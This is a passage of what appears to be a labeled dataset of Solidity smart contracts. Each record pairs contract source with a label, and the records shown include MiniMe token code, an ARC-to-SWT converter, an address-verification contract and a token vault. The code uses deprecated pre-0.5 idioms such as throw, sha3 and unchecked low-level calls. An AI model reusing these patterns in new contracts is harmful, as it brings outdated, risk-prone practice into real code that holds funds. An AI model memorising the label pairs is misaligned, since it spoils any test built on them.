*should* succeed, otherwise the plain vanilla approve would be used\r\r\n        if(!_spender.call(\r\r\n            bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))),\r\r\n            msg.sender,\r\r\n            _amount,\r\r\n            this,\r\r\n            _extraData\r\r\n            )) { throw;\r\r\n        }\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev This function makes it easy to get the total number of tokens\r\r\n    \/\/\/ @return The total number of tokens\r\r\n    function totalSupply() constant returns (uint) {\r\r\n        return totalSupplyAt(block.number);\r\r\n    }\r\r\n\r\r\n\r\r\n\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\r\r\n\/\/ Query balance and totalSupply in History\r\r\n\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\r\r\n\r\r\n    \/\/\/ @dev Queries the balance of `_owner` at a specific `_blockNumber`\r\r\n    \/\/\/ @param _owner The address from which the balance will be retrieved\r\r\n    \/\/\/ @param _blockNumber The block number when the balance is queried\r\r\n    \/\/\/ @return The balance at `_blockNumber`\r\r\n    function balanceOfAt(address _owner, uint _blockNumber) constant\r\r\n        returns (uint) {\r\r\n\r\r\n        \/\/ If the `_blockNumber` requested is before the genesis block for the\r\r\n        \/\/  the token being queried, the value returned is 0\r\r\n        if (_blockNumber < creationBlock) {\r\r\n            return 0;\r\r\n\r\r\n        \/\/ These next few lines are used when the balance of the token is\r\r\n        \/\/  requested before a check point was ever created for this token, it\r\r\n        \/\/  requires that the `parentToken.balanceOfAt` be queried at the\r\r\n        \/\/  genesis block for that token as this contains initial balance of\r\r\n        \/\/  this token\r\r\n        } else if ((balances[_owner].length == 0)\r\r\n            || (balances[_owner][0].fromBlock > _blockNumber)) {\r\r\n            if (address(parentToken) != 0) {\r\r\n                return parentToken.balanceOfAt(_owner, parentSnapShotBlock);\r\r\n            } else {\r\r\n                \/\/ Has no parent\r\r\n                return 0;\r\r\n            }\r\r\n\r\r\n        \/\/ This will return the expected balance during normal situations\r\r\n        } else {\r\r\n            return getValueAt(balances[_owner], _blockNumber);\r\r\n        }\r\r\n\r\r\n    }\r\r\n\r\r\n    \/\/\/ @notice Total amount of tokens at a specific `_blockNumber`.\r\r\n    \/\/\/ @param _blockNumber The block number when the totalSupply is queried\r\r\n    \/\/\/ @return The total amount of tokens at `_blockNumber`\r\r\n    function totalSupplyAt(uint _blockNumber) constant returns(uint) {\r\r\n\r\r\n        \/\/ If the `_blockNumber` requested is before the genesis block for the\r\r\n        \/\/  the token being queried, the value returned is 0\r\r\n        if (_blockNumber < creationBlock) {\r\r\n            return 0;\r\r\n\r\r\n        \/\/ These next few lines are used when the totalSupply of the token is\r\r\n        \/\/  requested before a check point was ever created for this token, it\r\r\n        \/\/  requires that the `parentToken.totalSupplyAt` be queried at the\r\r\n        \/\/  genesis block for this token as that contains totalSupply of this\r\r\n        \/\/  token at this block number.\r\r\n        } else if ((totalSupplyHistory.length == 0)\r\r\n            || (totalSupplyHistory[0].fromBlock > _blockNumber)) {\r\r\n            if (address(parentToken) != 0) {\r\r\n                return parentToken.totalSupplyAt(parentSnapShotBlock);\r\r\n            } else {\r\r\n                return 0;\r\r\n            }\r\r\n\r\r\n        \/\/ This will return the expected totalSupply during normal situations\r\r\n        } else {\r\r\n            return getValueAt(totalSupplyHistory, _blockNumber);\r\r\n        }\r\r\n    }\r\r\n\r\r\n\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\r\r\n\/\/ Clone Token Method\r\r\n\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\r\r\n\r\r\n    \/\/\/ @notice Creates a new clone token with the initial distribution being\r\r\n    \/\/\/  this token at `_snapshotBlock`\r\r\n    \/\/\/ @param _cloneTokenName Name of the clone token\r\r\n    \/\/\/ @param _cloneDecimalUnits Number of decimals of the smallest unit\r\r\n    \/\/\/ @param _cloneTokenSymbol Symbol of the clone token\r\r\n    \/\/\/ @param _snapshotBlock Block when the distribution of the parent token is\r\r\n    \/\/\/  copied to set the initial distribution of the new clone token;\r\r\n    \/\/\/  if the block is higher than the actual block, the current block is used\r\r\n    \/\/\/ @param _transfersEnabled True if transfers are allowed in the clone\r\r\n    \/\/\/ @return The address of the new MiniMeToken Contract\r\r\n    function createCloneToken(\r\r\n        string _cloneTokenName,\r\r\n        uint8 _cloneDecimalUnits,\r\r\n        string _cloneTokenSymbol,\r\r\n        uint _snapshotBlock,\r\r\n        bool _transfersEnabled\r\r\n        ) returns(address) {\r\r\n        if (_snapshotBlock > block.number) _snapshotBlock = block.number;\r\r\n        MiniMeToken cloneToken = tokenFactory.createCloneToken(\r\r\n            this,\r\r\n            _snapshotBlock,\r\r\n            _cloneTokenName,\r\r\n            _cloneDecimalUnits,\r\r\n            _cloneTokenSymbol,\r\r\n            _transfersEnabled\r\r\n            );\r\r\n\r\r\n        cloneToken.changeController(msg.sender);\r\r\n\r\r\n        \/\/ An event to make the token easy to find on the blockchain\r\r\n        NewCloneToken(address(cloneToken), _snapshotBlock);\r\r\n        return address(cloneToken);\r\r\n    }\r\r\n\r\r\n\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\r\r\n\/\/ Generate and destroy tokens\r\r\n\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\r\r\n\r\r\n    \/\/\/ @notice Generates `_amount` tokens that are assigned to `_owner`\r\r\n    \/\/\/ @param _owner The address that will be assigned the new tokens\r\r\n    \/\/\/ @param _amount The quantity of tokens generated\r\r\n    \/\/\/ @return True if the tokens are generated correctly\r\r\n    function generateTokens(address _owner, uint _amount\r\r\n    ) onlyController returns (bool) {\r\r\n        uint curTotalSupply = getValueAt(totalSupplyHistory, block.number);\r\r\n        updateValueAtNow(totalSupplyHistory, curTotalSupply + _amount);\r\r\n        var previousBalanceTo = balanceOf(_owner);\r\r\n        updateValueAtNow(balances[_owner], previousBalanceTo + _amount);\r\r\n        Transfer(0, _owner, _amount);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n\r\r\n    \/\/\/ @notice Burns `_amount` tokens from `_owner`\r\r\n    \/\/\/ @param _owner The address that will lose the tokens\r\r\n    \/\/\/ @param _amount The quantity of tokens to burn\r\r\n    \/\/\/ @return True if the tokens are burned correctly\r\r\n    function destroyTokens(address _owner, uint _amount\r\r\n    ) onlyController returns (bool) {\r\r\n        uint curTotalSupply = getValueAt(totalSupplyHistory, block.number);\r\r\n        if (curTotalSupply < _amount) throw;\r\r\n        updateValueAtNow(totalSupplyHistory, curTotalSupply - _amount);\r\r\n        var previousBalanceFrom = balanceOf(_owner);\r\r\n        if (previousBalanceFrom < _amount) throw;\r\r\n        updateValueAtNow(balances[_owner], previousBalanceFrom - _amount);\r\r\n        Transfer(_owner, 0, _amount);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\r\r\n\/\/ Enable tokens transfers\r\r\n\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\r\r\n\r\r\n\r\r\n    \/\/\/ @notice Enables token holders to transfer their tokens freely if true\r\r\n    \/\/\/ @param _transfersEnabled True if transfers are allowed in the clone\r\r\n    function enableTransfers(bool _transfersEnabled) onlyController {\r\r\n        transfersEnabled = _transfersEnabled;\r\r\n    }\r\r\n\r\r\n\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\r\r\n\/\/ Internal helper functions to query and set a value in a snapshot array\r\r\n\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\r\r\n\r\r\n    \/\/\/ @dev `getValueAt` retrieves the number of tokens at a given block number\r\r\n    \/\/\/ @param checkpoints The history of values being queried\r\r\n    \/\/\/ @param _block The block number to retrieve the value at\r\r\n    \/\/\/ @return The number of tokens being queried\r\r\n    function getValueAt(Checkpoint[] storage checkpoints, uint _block\r\r\n    ) constant internal returns (uint) {\r\r\n        if (checkpoints.length == 0) return 0;\r\r\n\r\r\n        \/\/ Shortcut for the actual value\r\r\n        if (_block >= checkpoints[checkpoints.length-1].fromBlock)\r\r\n            return checkpoints[checkpoints.length-1].value;\r\r\n        if (_block < checkpoints[0].fromBlock) return 0;\r\r\n\r\r\n        \/\/ Binary search of the value in the array\r\r\n        uint min = 0;\r\r\n        uint max = checkpoints.length-1;\r\r\n        while (max > min) {\r\r\n            uint mid = (max + min + 1)\/ 2;\r\r\n            if (checkpoints[mid].fromBlock<=_block) {\r\r\n                min = mid;\r\r\n            } else {\r\r\n                max = mid-1;\r\r\n            }\r\r\n        }\r\r\n        return checkpoints[min].value;\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev `updateValueAtNow` used to update the `balances` map and the\r\r\n    \/\/\/  `totalSupplyHistory`\r\r\n    \/\/\/ @param checkpoints The history of data being updated\r\r\n    \/\/\/ @param _value The new number of tokens\r\r\n    function updateValueAtNow(Checkpoint[] storage checkpoints, uint _value\r\r\n    ) internal  {\r\r\n        if ((checkpoints.length == 0)\r\r\n        || (checkpoints[checkpoints.length -1].fromBlock < block.number)) {\r\r\n               Checkpoint newCheckPoint = checkpoints[ checkpoints.length++ ];\r\r\n               newCheckPoint.fromBlock =  uint128(block.number);\r\r\n               newCheckPoint.value = uint128(_value);\r\r\n           } else {\r\r\n               Checkpoint oldCheckPoint = checkpoints[checkpoints.length-1];\r\r\n               oldCheckPoint.value = uint128(_value);\r\r\n           }\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev Internal function to determine if an address is a contract\r\r\n    \/\/\/ @param _addr The address being queried\r\r\n    \/\/\/ @return True if `_addr` is a contract\r\r\n    function isContract(address _addr) constant internal returns(bool) {\r\r\n        uint size;\r\r\n        if (_addr == 0) return false;\r\r\n        assembly {\r\r\n            size := extcodesize(_addr)\r\r\n        }\r\r\n        return size>0;\r\r\n    }\r\r\n\r\r\n    \/\/\/ @notice The fallback function: If the contract&#39;s controller has not been\r\r\n    \/\/\/  set to 0, then the `proxyPayment` method is called which relays the\r\r\n    \/\/\/  ether and creates tokens as described in the token controller contract\r\r\n    function ()  payable {\r\r\n        if (isContract(controller)) {\r\r\n            if (! TokenController(controller).proxyPayment.value(msg.value)(msg.sender))\r\r\n                throw;\r\r\n        } else {\r\r\n            throw;\r\r\n        }\r\r\n    }\r\r\n\r\r\n\r\r\n\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\r\r\n\/\/ Events\r\r\n\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\r\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _amount);\r\r\n    event NewCloneToken(address indexed _cloneToken, uint _snapshotBlock);\r\r\n    event Approval(\r\r\n        address indexed _owner,\r\r\n        address indexed _spender,\r\r\n        uint256 _amount\r\r\n        );\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\r\r\n\/\/ MiniMeTokenFactory\r\r\n\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\r\r\n\r\r\n\/\/\/ @dev This contract is used to generate clone contracts from a contract.\r\r\n\/\/\/  In solidity this is the way to create a contract from a contract of the\r\r\n\/\/\/  same class\r\r\ncontract MiniMeTokenFactory {\r\r\n\r\r\n    \/\/\/ @notice Update the DApp by creating a new token with new functionalities\r\r\n    \/\/\/  the msg.sender becomes the controller of this clone token\r\r\n    \/\/\/ @param _parentToken Address of the token being cloned\r\r\n    \/\/\/ @param _snapshotBlock Block of the parent token that will\r\r\n    \/\/\/  determine the initial distribution of the clone token\r\r\n    \/\/\/ @param _tokenName Name of the new token\r\r\n    \/\/\/ @param _decimalUnits Number of decimals of the new token\r\r\n    \/\/\/ @param _tokenSymbol Token Symbol for the new token\r\r\n    \/\/\/ @param _transfersEnabled If true, tokens will be able to be transferred\r\r\n    \/\/\/ @return The address of the new token contract\r\r\n    function createCloneToken(\r\r\n        address _parentToken,\r\r\n        uint _snapshotBlock,\r\r\n        string _tokenName,\r\r\n        uint8 _decimalUnits,\r\r\n        string _tokenSymbol,\r\r\n        bool _transfersEnabled\r\r\n    ) returns (MiniMeToken) {\r\r\n        MiniMeToken newToken = new MiniMeToken(\r\r\n            this,\r\r\n            _parentToken,\r\r\n            _snapshotBlock,\r\r\n            _tokenName,\r\r\n            _decimalUnits,\r\r\n            _tokenSymbol,\r\r\n            _transfersEnabled\r\r\n            );\r\r\n\r\r\n        newToken.changeController(msg.sender);\r\r\n        return newToken;\r\r\n    }\r\r\n}\r\r\n\r\r\n\r\r\n\/\/ Taken from Zeppelin&#39;s standard contracts.\r\r\ncontract ERC20 {\r\r\n  uint public totalSupply;\r\r\n  function balanceOf(address who) constant returns (uint);\r\r\n  function allowance(address owner, address spender) constant returns (uint);\r\r\n\r\r\n  function transfer(address to, uint value) returns (bool ok);\r\r\n  function transferFrom(address from, address to, uint value) returns (bool ok);\r\r\n  function approve(address spender, uint value) returns (bool ok);\r\r\n  event Transfer(address indexed from, address indexed to, uint value);\r\r\n  event Approval(address indexed owner, address indexed spender, uint value);\r\r\n}\r\r\n\r\r\n\r\r\n\/\/\/ @dev `Owned` is a base level contract that assigns an `owner` that can be\r\r\n\/\/\/  later changed\r\r\ncontract Owned {\r\r\n    \/\/\/ @dev `owner` is the only address that can call a function with this\r\r\n    \/\/\/ modifier\r\r\n    modifier onlyOwner { if (msg.sender != owner) throw; _; }\r\r\n\r\r\n    address public owner;\r\r\n\r\r\n    \/\/\/ @notice The Constructor assigns the message sender to be `owner`\r\r\n    function Owned() { owner = msg.sender;}\r\r\n\r\r\n    \/\/\/ @notice `owner` can step down and assign some other address to this role\r\r\n    \/\/\/ @param _newOwner The address of the new owner. 0x0 can be used to create\r\r\n    \/\/\/  an unowned neutral vault, however that cannot be undone\r\r\n    function changeOwner(address _newOwner) onlyOwner {\r\r\n        owner = _newOwner;\r\r\n    }\r\r\n}\r\r\n\r\r\ncontract SWTConverter is TokenController, Owned {\r\r\n\r\r\n    MiniMeToken public tokenContract;   \/\/ The new token\r\r\n    address public vaultAddress;        \/\/ The address to hold the funds donated\r\r\n    ERC20 public arcToken;              \/\/ The ARC token address\r\r\n\r\r\n    function SWTConverter(\r\r\n        address _vaultAddress,\r\r\n        address _tokenAddress,          \/\/ the new MiniMe token address\r\r\n        address _arctokenaddress        \/\/ the original ARC token address\r\r\n    ) {\r\r\n        if (_vaultAddress == 0)\r\r\n            {\r\r\n            throw;\r\r\n            }\r\r\n        vaultAddress = _vaultAddress;\r\r\n        tokenContract = MiniMeToken(_tokenAddress); \/\/ The Deployed Token Contract\r\r\n        arcToken = ERC20(_arctokenaddress);\r\r\n    }\r\r\n\r\r\n\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\r\r\n\/\/ TokenController interface\r\r\n\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\r\r\n\r\r\n\r\r\n function proxyPayment(address _owner) payable returns(bool) {\r\r\n        throw;\r\r\n    }\r\r\n\r\r\n\/\/\/ @notice Notifies the controller about a transfer, for this SWTConverter all\r\r\n\/\/\/  transfers are allowed by default and no extra notifications are needed\r\r\n\/\/\/ @param _from The origin of the transfer\r\r\n\/\/\/ @param _to The destination of the transfer\r\r\n\/\/\/ @param _amount The amount of the transfer\r\r\n\/\/\/ @return False if the controller does not authorize the transfer\r\r\n    function onTransfer(address _from, address _to, uint _amount) returns(bool) {\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n\/\/\/ @notice Notifies the controller about an approval, for this SWTConverter all\r\r\n\/\/\/  approvals are allowed by default and no extra notifications are needed\r\r\n\/\/\/ @param _owner The address that calls `approve()`\r\r\n\/\/\/ @param _spender The spender in the `approve()` call\r\r\n\/\/\/ @param _amount The amount in the `approve()` call\r\r\n\/\/\/ @return False if the controller does not authorize the approval\r\r\n    function onApprove(address _owner, address _spender, uint _amount)\r\r\n        returns(bool)\r\r\n    {\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n\r\r\n\/\/\/ @notice `onlyOwner` changes the location that ARC is sent\r\r\n\/\/\/ @param _newVaultAddress The address that will receive the ARC when converting tokens\r\r\n    function setVault(address _newVaultAddress) onlyOwner {\r\r\n        vaultAddress = _newVaultAddress;\r\r\n    }\r\r\n\r\r\n\/\/\/ @notice converts ARC tokens to new SWT tokens and forwards ARC to the vault address.\r\r\n\/\/\/ @param _amount The amount of ARC to convert to SWT\r\r\n function convert(uint _amount){\r\r\n\r\r\n        \/\/ transfer ARC to the vault address. caller needs to have an allowance from\r\r\n        \/\/ this controller contract for _amount before calling this or the transferFrom will fail.\r\r\n        if (!arcToken.transferFrom.gas(100000)(msg.sender, vaultAddress, _amount)) {\r\r\n            throw;\r\r\n        }\r\r\n\r\r\n        \/\/ mint new SWT tokens\r\r\n        if (!tokenContract.generateTokens(msg.sender, _amount)) {\r\r\n            throw;\r\r\n        }\r\r\n    }\r\r\n\r\r\n\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.2;\r\r\n\r\r\ncontract AddressOwnershipVerification {\r\r\n    mapping(address => mapping (uint32 => address)) _requests;        \/\/ Pending requests (transactee address => (deposit => transactor address)\r\r\n    mapping(address => mapping (address => uint32)) _requestsReverse; \/\/ Used for reverse lookups  (transactee address => (transactor address => deposit)\r\r\n    mapping(address => mapping (address => uint32)) _verifications;   \/\/ Verified requests (transactor address => (transactee address => deposit)\r\r\n\r\r\n    event RequestEvent(address indexed transactor, address indexed transactee, uint32 indexed deposit);      \/\/ Event is triggered when a new request is added\r\r\n    event RemoveRequestEvent(address indexed transactor, address indexed transactee);                        \/\/ Event is triggered when an unverified request is removed\r\r\n    event VerificationEvent(address indexed transactor, address indexed transactee, uint32 indexed deposit); \/\/ Event is triggered when someone proves ownership of an address\r\r\n    event RevokeEvent(address indexed transactor, address indexed transactee, uint32 indexed deposit);       \/\/ Event is triggered when either party removes a trust\r\r\n\r\r\n    function AddressOwnershipVerification() {}\r\r\n\r\r\n    \/\/ Used to verify pending requests by transactee sending deposit to this contract\r\r\n    function () payable {\r\r\n        uint32 value = uint32(msg.value);\r\r\n\r\r\n        if (!_requestExists(msg.sender, value)) {\r\r\n            throw;\r\r\n        }\r\r\n\r\r\n        \/\/ Get matching transactor for request\r\r\n        address transactor = _requests[msg.sender][value];\r\r\n\r\r\n        \/\/ Save new Verification\r\r\n        _saveVerification(transactor, msg.sender, value);\r\r\n\r\r\n        \/\/ And then delete the verified request\r\r\n        _deleteRequest(transactor, msg.sender);\r\r\n\r\r\n        VerificationEvent(transactor, msg.sender, value);\r\r\n    }\r\r\n\r\r\n    \/\/ Request a new verification as transactor\r\r\n    function request(address transactee, uint32 deposit) {\r\r\n        \/\/ Throw if sender wastes blockchain space\r\r\n        if (transactee == msg.sender) {\r\r\n            throw;\r\r\n        }\r\r\n\r\r\n        \/\/ Deposit can&#39;t be 0 because all uint&#39;s get initialized to 0 in _requests\r\r\n        if (deposit == 0) {\r\r\n            throw;\r\r\n        }\r\r\n\r\r\n        \/\/ Throw if transactee already provided verification to transactor\r\r\n        if(verify(msg.sender, transactee)) {\r\r\n            throw;\r\r\n        }\r\r\n\r\r\n        \/\/ Throw if transactee already has a pending request for this exact deposit\r\r\n        if (_requestExists(transactee, deposit)) {\r\r\n            throw;\r\r\n        }\r\r\n\r\r\n        if (_requestExistsReverse(msg.sender, transactee)) {\r\r\n            throw;\r\r\n        }\r\r\n\r\r\n        _saveRequest(msg.sender, transactee, deposit);\r\r\n\r\r\n        RequestEvent(msg.sender, transactee, deposit);\r\r\n    }\r\r\n\r\r\n    \/\/ Returns amount of wei transactee has to send to fullfill transactor&#39;s request\r\r\n    function getRequest(address transactor, address transactee) returns (uint32 deposit) {\r\r\n        return _requestsReverse[transactee][transactor];\r\r\n    }\r\r\n\r\r\n    \/\/ Removes a pending request as transactor or transactee\r\r\n    function removeRequest(address transactor, address transactee) returns (uint32) {\r\r\n        \/\/ Only transactor and transactee can trigger removal of their request\r\r\n        if (msg.sender != transactor && msg.sender != transactee) {\r\r\n            throw;\r\r\n        }\r\r\n\r\r\n        _deleteRequest(transactor, transactee);\r\r\n\r\r\n        RemoveRequestEvent(transactor, transactee);\r\r\n    }\r\r\n\r\r\n    \/\/  Returns true if transactee has already proven their address ownership to transactor in the past\r\r\n    function verify(address transactor, address transactee) returns (bool) {\r\r\n        return _verifications[transactor][transactee] != 0;\r\r\n    }\r\r\n\r\r\n    \/\/ Removes an existing verification and returns the deposited amount to transactee\r\r\n    \/\/ Can be called by either transactor or transactee\r\r\n    function revoke(address transactor, address transactee) {\r\r\n        \/\/ Only transactor and transactee can trigger removal of their verification\r\r\n        if (msg.sender != transactor && msg.sender != transactee) {\r\r\n            throw;\r\r\n        }\r\r\n\r\r\n        \/\/ Throw if verification does not exist\r\r\n        if(!verify(transactor, transactee)) {\r\r\n            throw;\r\r\n        }\r\r\n\r\r\n        uint32 deposit = _verifications[transactor][transactee];\r\r\n\r\r\n        \/\/ Delete verification\r\r\n        delete _verifications[transactor][transactee];\r\r\n\r\r\n        \/\/ Send deposit to transactee\r\r\n        if (!transactee.call.value(deposit).gas(23000)()) {\r\r\n            throw;\r\r\n        }\r\r\n\r\r\n        RevokeEvent(transactor, transactee, deposit);\r\r\n    }\r\r\n\r\r\n    \/\/ Internal: Save a new request\r\r\n    function _saveRequest(address transactor, address transactee, uint32 deposit) internal {\r\r\n        _requests[transactee][deposit] = transactor;\r\r\n        _requestsReverse[transactee][transactor] = deposit;\r\r\n    }\r\r\n\r\r\n    \/\/ Internal: Remove a fullfilled request\r\r\n    function _deleteRequest(address transactor, address transactee) internal {\r\r\n        uint32 deposit = _requestsReverse[transactee][transactor];\r\r\n\r\r\n        delete _requests[transactee][deposit];\r\r\n        delete _requestsReverse[transactee][transactor];\r\r\n    }\r\r\n\r\r\n    \/\/ Internal: Test if a request exists when you know transactee and deposit\r\r\n    function _requestExists(address transactee, uint32 deposit) internal returns(bool) {\r\r\n        return _requests[transactee][deposit] != 0x0000000000000000000000000000000000000000;\r\r\n    }\r\r\n\r\r\n    \/\/ Internal: Test if a request exists when you know transactee and transactor\r\r\n    function _requestExistsReverse(address transactor, address transactee) internal returns(bool) {\r\r\n        return _requestsReverse[transactee][transactor] != 0;\r\r\n    }\r\r\n\r\r\n    \/\/ Internal: Save a new verification\r\r\n    function _saveVerification(address transactor, address transactee, uint32 deposit) internal {\r\r\n        _verifications[transactor][transactee] = deposit;\r\r\n    }\r\r\n}","label":0}
{"code":"\/*\r\r\n * ERC20 interface\r\r\n * see https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\r\n *\/\r\r\ncontract ERC20 {\r\r\n  uint public totalSupply;\r\r\n  function balanceOf(address who) constant returns (uint);\r\r\n  function allowance(address owner, address spender) constant returns (uint);\r\r\n\r\r\n  function transfer(address to, uint value) returns (bool ok);\r\r\n  function transferFrom(address from, address to, uint value) returns (bool ok);\r\r\n  function approve(address spender, uint value) returns (bool ok);\r\r\n  event Transfer(address indexed from, address indexed to, uint value);\r\r\n  event Approval(address indexed owner, address indexed spender, uint value);\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * Math operations with safety checks\r\r\n *\/\r\r\ncontract SafeMath {\r\r\n  function safeMul(uint a, uint b) internal returns (uint) {\r\r\n    uint c = a * b;\r\r\n    assert(a == 0 || c \/ a == b);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function safeDiv(uint a, uint b) internal returns (uint) {\r\r\n    assert(b > 0);\r\r\n    uint c = a \/ b;\r\r\n    assert(a == b * c + a % b);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function safeSub(uint a, uint b) internal returns (uint) {\r\r\n    assert(b <= a);\r\r\n    return a - b;\r\r\n  }\r\r\n\r\r\n  function safeAdd(uint a, uint b) internal returns (uint) {\r\r\n    uint c = a + b;\r\r\n    assert(c>=a && c>=b);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function max64(uint64 a, uint64 b) internal constant returns (uint64) {\r\r\n    return a >= b ? a : b;\r\r\n  }\r\r\n\r\r\n  function min64(uint64 a, uint64 b) internal constant returns (uint64) {\r\r\n    return a < b ? a : b;\r\r\n  }\r\r\n\r\r\n  function max256(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    return a >= b ? a : b;\r\r\n  }\r\r\n\r\r\n  function min256(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    return a < b ? a : b;\r\r\n  }\r\r\n\r\r\n  function assert(bool assertion) internal {\r\r\n    if (!assertion) {\r\r\n      throw;\r\r\n    }\r\r\n  }\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * Standard ERC20 token with Short Hand Attack and approve() race condition mitigation.\r\r\n *\r\r\n * Based on code by FirstBlood:\r\r\n * https:\/\/github.com\/Firstbloodio\/token\/blob\/master\/smart_contract\/FirstBloodToken.sol\r\r\n *\/\r\r\ncontract StandardToken is ERC20, SafeMath {\r\r\n\r\r\n  \/* Token supply got increased and a new owner received these tokens *\/\r\r\n  event Minted(address receiver, uint amount);\r\r\n\r\r\n  \/* Actual balances of token holders *\/\r\r\n  mapping(address => uint) balances;\r\r\n\r\r\n  \/* approve() allowances *\/\r\r\n  mapping (address => mapping (address => uint)) allowed;\r\r\n\r\r\n  \/* Interface declaration *\/\r\r\n  function isToken() public constant returns (bool weAre) {\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  function transfer(address _to, uint _value) returns (bool success) {\r\r\n    balances[msg.sender] = safeSub(balances[msg.sender], _value);\r\r\n    balances[_to] = safeAdd(balances[_to], _value);\r\r\n    Transfer(msg.sender, _to, _value);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  function transferFrom(address _from, address _to, uint _value) returns (bool success) {\r\r\n    uint _allowance = allowed[_from][msg.sender];\r\r\n\r\r\n    balances[_to] = safeAdd(balances[_to], _value);\r\r\n    balances[_from] = safeSub(balances[_from], _value);\r\r\n    allowed[_from][msg.sender] = safeSub(_allowance, _value);\r\r\n    Transfer(_from, _to, _value);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  function balanceOf(address _owner) constant returns (uint balance) {\r\r\n    return balances[_owner];\r\r\n  }\r\r\n\r\r\n  function approve(address _spender, uint _value) returns (bool success) {\r\r\n\r\r\n    \/\/ To change the approve amount you first have to reduce the addresses`\r\r\n    \/\/  allowance to zero by calling `approve(_spender, 0)` if it is not\r\r\n    \/\/  already 0 to mitigate the race condition described here:\r\r\n    \/\/  https:\/\/github.com\/ethereum\/EIPs\/issues\/20#issuecomment-263524729\r\r\n    if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;\r\r\n\r\r\n    allowed[msg.sender][_spender] = _value;\r\r\n    Approval(msg.sender, _spender, _value);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  function allowance(address _owner, address _spender) constant returns (uint remaining) {\r\r\n    return allowed[_owner][_spender];\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\/*\r\r\n * Ownable\r\r\n *\r\r\n * Base contract with an owner.\r\r\n * Provides onlyOwner modifier, which prevents function from running if it is called by anyone other than the owner.\r\r\n *\/\r\r\ncontract Ownable {\r\r\n  address public owner;\r\r\n\r\r\n  function Ownable() {\r\r\n    owner = msg.sender;\r\r\n  }\r\r\n\r\r\n  modifier onlyOwner() {\r\r\n    if (msg.sender != owner) {\r\r\n      throw;\r\r\n    }\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  function transferOwnership(address newOwner) onlyOwner {\r\r\n    if (newOwner != address(0)) {\r\r\n      owner = newOwner;\r\r\n    }\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\/**\r\r\n * Hold tokens for a group investor of investors until the unlock date.\r\r\n *\r\r\n * After the unlock date the investor can claim their tokens.\r\r\n *\r\r\n * Steps\r\r\n *\r\r\n * - Prepare a spreadsheet for token allocation\r\r\n * - Deploy this contract, with the sum to tokens to be distributed, from the owner account\r\r\n * - Call setInvestor for all investors from the owner account using a local script and CSV input\r\r\n * - Move tokensToBeAllocated in this contract using StandardToken.transfer()\r\r\n * - Call lock from the owner account\r\r\n * - Wait until the freeze period is over\r\r\n * - After the freeze time is over investors can call claim() from their address to get their tokens\r\r\n *\r\r\n *\/\r\r\ncontract TokenVault is Ownable {\r\r\n\r\r\n  \/** How many investors we have now *\/\r\r\n  uint public investorCount;\r\r\n\r\r\n  \/** Sum from the spreadsheet how much tokens we should get on the contract. If the sum does not match at the time of the lock the vault is faulty and must be recreated.*\/\r\r\n  uint public tokensToBeAllocated;\r\r\n\r\r\n  \/** How many tokens investors have claimed so far *\/\r\r\n  uint public totalClaimed;\r\r\n\r\r\n  \/** How many tokens our internal book keeping tells us to have at the time of lock() when all investor data has been loaded *\/\r\r\n  uint public tokensAllocatedTotal;\r\r\n\r\r\n  \/** How much we have allocated to the investors invested *\/\r\r\n  mapping(address => uint) public balances;\r\r\n\r\r\n  \/** How many tokens investors have claimed *\/\r\r\n  mapping(address => uint) public claimed;\r\r\n\r\r\n  \/** When our claim freeze is over (UNIX timestamp) *\/\r\r\n  uint public freezeEndsAt;\r\r\n\r\r\n  \/** When this vault was locked (UNIX timestamp) *\/\r\r\n  uint public lockedAt;\r\r\n\r\r\n  \/** We can also define our own token, which will override the ICO one ***\/\r\r\n  StandardToken public token;\r\r\n\r\r\n  \/** What is our current state.\r\r\n   *\r\r\n   * Loading: Investor data is being loaded and contract not yet locked\r\r\n   * Holding: Holding tokens for investors\r\r\n   * Distributing: Freeze time is over, investors can claim their tokens\r\r\n   *\/\r\r\n  enum State{Unknown, Loading, Holding, Distributing}\r\r\n\r\r\n  \/** We allocated tokens for investor *\/\r\r\n  event Allocated(address investor, uint value);\r\r\n\r\r\n  \/** We distributed tokens to an investor *\/\r\r\n  event Distributed(address 